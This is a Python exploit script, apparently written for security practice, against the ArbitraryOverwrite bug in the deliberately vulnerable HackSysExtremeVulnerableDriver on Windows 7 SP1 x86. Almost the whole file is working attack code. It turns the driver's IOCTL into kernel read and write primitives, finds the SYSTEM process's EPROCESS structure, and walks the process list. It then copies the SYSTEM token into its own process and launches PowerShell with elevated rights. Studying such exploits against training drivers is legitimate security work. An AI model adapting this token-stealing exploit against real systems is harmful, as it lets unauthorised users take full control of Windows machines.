#!/usr/bin/python
#
# HEVD v1.20 ArbitraryOverwrite exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import os
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_uint * 0x400
    addr = array()
    
    res = windll.psapi.EnumDeviceDrivers(byref(addr),
                                    sizeof(addr),
                                    byref(c_uint(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def get_device_name(addr):
    '''
    find file name of kernel via GetDeviceDriverBaseNameA
    '''
    buff = create_string_buffer(0x400)
    
    res = windll.psapi.GetDeviceDriverBaseNameA(addr,
                                    buff,
                                    sizeof(buff))
    if res == 0:
        return None
    
    return buff[:res]

def read_dword(addr):
    '''
    read dword from addr abusing the vulnerability
    '''
    res = c_uint(0)
    obj = struct.pack('<L', addr) + \
          struct.pack('<L', addressof(res))
    
    ioctl_code = 0x22200B   # call ArbitraryOverwriteIoctlHandler
    windll.kernel32.DeviceIoControl(hFile,
                                    ioctl_code,
                                    obj,
                                    len(obj),
                                    0,
                                    0,
                                    byref(c_int(0)),
                                    0)
    return res.value

def write_dword(addr, value):
    '''
    write value to addr abusing the vulnerability
    '''
    val = c_uint(value)
    obj = struct.pack('<L', addressof(val)) + \
          struct.pack('<L', addr)
    
    ioctl_code = 0x22200B   # call ArbitraryOverwriteIoctlHandler
    windll.kernel32.DeviceIoControl(hFile,
                                    ioctl_code,
                                    obj,
                                    len(obj),
                                    0,
                                    0,
                                    byref(c_int(0)),
                                    0)

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

# 1. find PsInitialSystemProcess
base_addr = get_kernel_base()
if not base_addr:
    print '[-] Failed to obtain Kernel base'
    sys.exit(1)
print '[+] Kernel base address: 0x%08x' % base_addr

kernel_name = get_device_name(base_addr)
if not kernel_name:
    print '[+] Failed to obtain Kernel name'
    sys.exit(1)
print '[+] Kernel name: %s' % kernel_name

hModule = windll.kernel32.LoadLibraryA(kernel_name)
if hModule == 0:
    print '[-] Failed to load Kernel image: %s' % kernel_name
    sys.exit(1)
print '[+] Kernel image loaded: 0x%08x' % hModule

sys_proc = windll.kernel32.GetProcAddress(hModule, 'PsInitialSystemProcess')
if sys_proc == 0:
    print '[-] Failed to find PsInitialSystemProcess'
    sys.exit(1)

# 2. steal token
sys_proc_kernel = base_addr - hModule + sys_proc 
print '[+] PsInitialSystemProcess is at: 0x%08x' % sys_proc_kernel

print '[+] Stealing SYSTEM token'

sys_eproc = read_dword(sys_proc_kernel)
sys_pid = read_dword(sys_eproc + 0xB4)                  # 0xB4 = offset nt!_EPROCESS.UniqueProcessId
sys_token = read_dword(sys_eproc + 0xF8)                # 0xF8 = offset nt!_EPROCESS.Token

print '[+] System\'s EPROCESS is at: 0x%08x' % sys_eproc
print '[+] pid = %x, token = 0x%08x' % (sys_pid, sys_token)

# 3. find my own EPROCESS
print '[+] Walking through ActiveProcessLinks list'

my_pid = os.getpid()
eproc = sys_eproc
while True:
    eproc = read_dword(eproc + 0xB8) - 0xB8             # 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
    pid = read_dword(eproc + 0xB4)                      # 0xB4 = offset nt!_EPROCESS.UniqueProcessId
    if pid == my_pid:
        print '[+] Found my EPROCESS: 0x%08x' % eproc
        my_eproc = eproc
        break
    if pid == sys_pid:
        print '[-] Couldn\'t find my EPROCESS'
        sys.exit(1)

# 4. setting stolen token
print '[+] Installing SYSTEM token'

write_dword(my_eproc + 0xF8, sys_token)                 # 0xF8 = offset nt!_EPROCESS.Token

# Got SYSTEM shell?
import os
os.system("powershell.exe")
